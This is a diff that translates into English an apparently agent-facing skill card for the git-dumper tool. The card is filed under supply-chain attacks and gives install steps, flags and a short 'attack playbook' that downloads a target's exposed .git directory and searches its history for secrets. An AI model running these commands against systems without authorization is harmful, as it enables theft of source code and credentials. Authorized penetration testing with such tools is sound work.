@@ -2,37 +2,40 @@
 name: git-dumper-repo
 description: "git-dumper recovers exposed .git repositories without directory listing. Signals: supply chain, CI/CD, download and restore repository, concurrency, aggressive scan mode."
 zh-signals: "git-dumper: 无目录列表的 .git 还原。信号:供应链,cicd,下载并还原仓库,并发,强扫模式。"
+when-to-use: >-
+  Use when a .git repository is exposed without directory listing and you need
+  to download and restore it using concurrency and aggressive scan modes.
 ---
 
 # git-dumper
 
-- 攻击大类:C12 供应链与CI/CD攻击
-- 上游仓库:https://github.com/arthaud/git-dumper
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C12 Supply Chain and CI/CD Attacks
+- Upstream Repository: https://github.com/arthaud/git-dumper
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 pip install git-dumper
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `git-dumper https://t.com/.git/ ./repo` | 下载并还原仓库 |
-| `--jobs 10` | 并发 |
-| `--brute` | 强扫模式 |
+| `git-dumper https://t.com/.git/ ./repo` | Download and restore the repository |
+| `--jobs 10` | Concurrency |
+| `--brute` | Aggressive scan mode |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 无目录列表的 .git 还原
+### Restoring a .git repository without directory listing
 
 ```bash
 git-dumper --jobs 20 https://target.com/.git/ leaked
-cd leaked && git log --all --oneline  # 全分支历史挖掘密钥
+cd leaked && git log --all --oneline  # Mine all branch history for secrets
 ```
 
-## 注意事项
+## Notes
 
-智能猜测 .git 对象文件名,无需目录列表;与 dvcs-ripper 互补。
+Guesses .git object filenames intelligently, no directory listing required; complements dvcs-ripper.
